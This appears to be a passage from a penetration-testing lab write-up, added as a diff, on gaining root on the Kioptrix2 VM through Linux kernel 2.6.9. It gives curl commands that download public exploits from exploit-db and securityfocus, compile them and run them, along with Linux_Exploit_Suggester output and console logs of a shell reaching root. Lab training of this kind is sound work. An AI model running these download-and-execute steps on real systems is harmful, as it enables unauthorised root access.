+#. Search Google (my first hit for "linux kernel 2.6.9 root exploit" was a successful exploit)
+
+Here we illustrate the Google search and :program:`Linux_Exploit_Suggester.pl`.
+
+Google search for root exploit
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Searching for kernel 2.6.9 root exploits lead to `Linux Kernel 2.6 < 2.6.19 - (32-bit) ip_append_data() ring0 Root Exploit <https://www.exploit-db.com/exploits/9542/>`_ (running on kioptrix2):
+
+.. code-block:: bash
+
+  cd /tmp
+  curl --silent --insecure --output 9542.c https://www.exploit-db.com/download/9542
+  dos2unix 9542.c
+  gcc 9542.c -o exploit9542
+  ./exploit9542
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ socat - TCP-LISTEN:$MYPORT
+  bash: no job control in this shell
+  bash-3.00$ cd /tmp
+  curl --silent --insecure --output 9542.c https://www.exploit-db.com/download/9542
+  bash-3.00$ dos2unix 9542.c
+  dos2unix: converting file 9542.c to UNIX format ...
+  bash-3.00$ gcc 9542.c -o exploit9542
+  bash-3.00$ ./exploit9542
+  sh: no job control in this shell
+  sh-3.00# id
+  uid=0(root) gid=0(root) groups=48(apache)
+  sh-3.00# 
+
+And we are root.
+
+:program:`Linux_Exploit_Suggester.pl`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Download and run `PenturaLabs/Linux_Exploit_Suggester <https://github.com/PenturaLabs/Linux_Exploit_Suggester>`_:
+
+.. code-block:: bash
+
+  curl --silent --insecure --remote-name \
+    https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
+  perl Linux_Exploit_Suggester.pl -k 2.6.9
+
+This gets these suggestions:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ curl --silent --insecure --remote-name \
+  >   https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
+  hacker@kali:~/pentest/kioptrix2/exploit$ perl Linux_Exploit_Suggester.pl -k 2.6.9
+
+  Kernel local: 2.6.9
+
+  Searching among 65 exploits...
+
+  Possible Exploits:
+  [+] american-sign-language
+     CVE-2010-4347
+     Source: http://www.securityfocus.com/bid/45408/
+  [+] exp.sh
+  [+] half_nelson
+     Alt: econet    CVE-2010-3848
+     Source: http://www.exploit-db.com/exploits/6851
+  [+] half_nelson1
+     Alt: econet    CVE-2010-3848
+     Source: http://www.exploit-db.com/exploits/17787/
+  [+] half_nelson2
+     Alt: econet    CVE-2010-3850
+     Source: http://www.exploit-db.com/exploits/17787/
+  [+] half_nelson3
+     Alt: econet    CVE-2010-4073
+     Source: http://www.exploit-db.com/exploits/17787/
+  [+] krad
+  [+] krad3
+     Source: http://exploit-db.com/exploits/1397
+  [+] pktcdvd
+     CVE-2010-3437
+     Source: http://www.exploit-db.com/exploits/15150/
+  [+] py2
+  [+] sock_sendpage
+     Alt: wunderbar_emporium    CVE-2009-2692
+     Source: http://www.exploit-db.com/exploits/9435
+  [+] sock_sendpage2
+     Alt: proto_ops    CVE-2009-2692
+     Source: http://www.exploit-db.com/exploits/9436
+  [+] udp_sendmsg_32bit
+     CVE-2009-2698
+     Source: http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c
+  [+] video4linux
+     CVE-2010-3081
+     Source: http://www.exploit-db.com/exploits/15024/
+
+The suggestion udp_sendmsg_32bit worked:
+
+.. code-block:: console
+
+  bash-3.00$ curl --silent --output 36108.c --insecure http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c
+  bash-3.00$ gcc -o exploit36108 36108.c
+  bash-3.00$ ./exploit36108
+  sh: no job control in this shell
+  sh-3.00# id
+  uid=0(root) gid=0(root) groups=48(apache)
+  sh-3.00# 
+
+And we have root.
+
+
+
